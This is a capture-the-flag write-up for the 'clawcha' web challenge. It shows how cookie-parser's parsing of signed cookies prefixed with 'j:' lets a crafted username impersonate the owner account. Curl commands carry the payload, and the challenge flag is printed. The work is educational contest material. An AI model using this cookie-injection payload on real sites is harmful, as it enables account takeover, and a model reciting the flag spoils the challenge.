## Web: clawcha

**Challenge**: web/clawcha (r2uwu2)  
**URL**: clawcha.chall.lac.tf  
**Description**: "I found a hoyoverse claw machine out in the wild. You should play it a lot and give ~~me~~ it all your moneys."

### Summary
The app uses `cookie-parser` with a signed `username` cookie. After signature verification, `cookie-parser` also JSON-parses values that start with `j:`. This allows a signed cookie value like `j:"r2uwu2"\t\t\t` to be parsed into the string `r2uwu2`, bypassing the owner check without knowing the secret. The `/login` endpoint auto-registers new usernames, so we can create a new account with a distinct string that still JSON-parses to `r2uwu2`.

### Vulnerability Details
- `app.js` sets a signed `username` cookie and later reads `req.signedCookies.username`.
- `cookie-parser` calls `JSONCookies()` on signed cookies, which converts any value prefixed with `j:` into parsed JSON.
- If the signed cookie value is `j:"r2uwu2"\t\t\t`, JSON parsing ignores trailing whitespace and yields the string `r2uwu2`.
- The server then treats the request as the owner account (`r2uwu2`) and guarantees a flag pull.

### Exploit Steps
1. Register a new user whose username is a JSON cookie that parses to `r2uwu2` but is a distinct string (so it is not already taken).  
2. Use the signed cookie from that login to call `/claw` for the `flag` item.

### Commands Used
```bash
rm -f /tmp/clawcha.txt

curl -i -c /tmp/clawcha.txt \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"j:\"r2uwu2\"\t\t\t","password":"pw"}' \
  https://clawcha.chall.lac.tf/login

grep username /tmp/clawcha.txt

curl -s -b /tmp/clawcha.txt \
  -H 'Content-Type: application/json' \
  --data-raw '{"item":"flag"}' \
  https://clawcha.chall.lac.tf/claw
```

### Flag
```
lactf{m4yb3_th3_r34l_g4ch4_w4s_l7f3}
```
